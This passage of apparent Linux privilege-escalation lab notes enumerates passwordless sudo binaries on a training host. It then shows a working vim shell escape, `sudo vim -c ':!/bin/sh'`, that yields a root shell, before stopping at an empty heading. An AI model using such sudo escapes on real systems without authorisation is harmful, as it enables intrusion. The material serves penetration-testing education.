## Shell Escaping

We can find the commands our user can run as sudo by typing `sudo -l`

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

We see that there are several commands we can run as sudo without a password as this user. We can use one of these commands to see whether there is shell escape available though [GTFOBins](https://gtfobins.github.io/). For example we can exploit `vim` as follow.

```bash
TCM@debian:~$ sudo vim -c ':!/bin/sh'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
```

## Intended Functionality

